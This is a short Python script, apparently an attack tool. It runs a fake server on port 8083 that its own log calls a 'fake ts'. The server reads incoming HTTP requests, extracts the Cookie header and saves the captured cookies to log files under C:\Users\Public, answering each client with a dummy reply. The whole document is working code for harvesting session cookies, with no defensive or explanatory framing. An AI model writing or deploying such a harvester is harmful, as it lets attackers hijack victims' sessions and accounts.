# -*- coding: utf-8 -*-
import socket

OUT = open(r"C:\Users\Public\ob_cookie.log", "a", encoding="utf-8")


def log(m):
    OUT.write(m + "\n")
    OUT.flush()
    print(m, flush=True)


def serve_one(s):
    c, addr = s.accept()
    log("conn from %s" % (addr,))
    data = b""
    c.settimeout(15)
    try:
        while b"\r\n\r\n" not in data:
            chunk = c.recv(65536)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    text = data.decode(errors="replace")
    cookie = ""
    for line in text.splitlines():
        if line.lower().startswith("cookie:"):
            cookie = line.split(":", 1)[1].strip()
    if cookie:
        with open(r"C:\Users\Public\ob_cookie_b64.txt", "a") as f:
            f.write(cookie + "\n")
        log("COOKIE CAPTURED len=%d head=%s" % (len(cookie), cookie[:60]))
    else:
        first = text.splitlines()[0] if text else "empty"
        log("req no cookie: %r" % first)
    c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 4\r\n\r\nping")
    c.close()


def main():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 8083))
    s.listen(16)
    log("fake ts bound 8083 persistent")
    while True:
        try:
            serve_one(s)
        except Exception as e:
            log("conn error: %s" % e)


if __name__ == "__main__":
    main()
